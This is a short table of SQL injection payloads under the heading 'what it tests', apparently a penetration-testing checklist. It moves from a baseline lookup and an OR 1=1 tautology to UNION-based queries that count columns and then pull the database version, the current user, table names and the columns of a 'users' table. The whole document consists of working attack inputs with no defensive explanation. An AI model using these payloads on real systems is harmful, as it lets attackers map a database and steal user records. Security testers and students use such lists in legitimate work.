Payload	What it tests
1	Baseline, normal lookup
1 OR 1=1	
1 UNION SELECT 1,2,3,4,5,6	
1 UNION SELECT null,version(),database(),user(),null,null	
1 UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables	
1 UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users'